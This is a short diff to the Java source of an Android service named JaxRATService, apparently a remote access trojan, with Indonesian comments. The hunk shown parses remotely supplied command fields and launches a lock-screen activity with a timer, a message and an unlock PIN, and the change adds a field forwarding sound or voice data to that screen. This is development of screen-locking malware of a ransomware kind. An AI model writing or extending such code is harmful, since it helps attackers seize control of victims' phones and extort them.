@@ -101,6 +101,7 @@ public class JaxRATService extends Service {
             if (parts.length >= 7) {
                 Intent intent = new Intent(this, LockScreenActivity.class);
                 intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
+                intent.putExtra("SUARA", parts[2].trim()); // Terusin data suara
                 intent.putExtra("PESAN", parts[5].trim());
                 intent.putExtra("PIN", parts[6].trim());
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
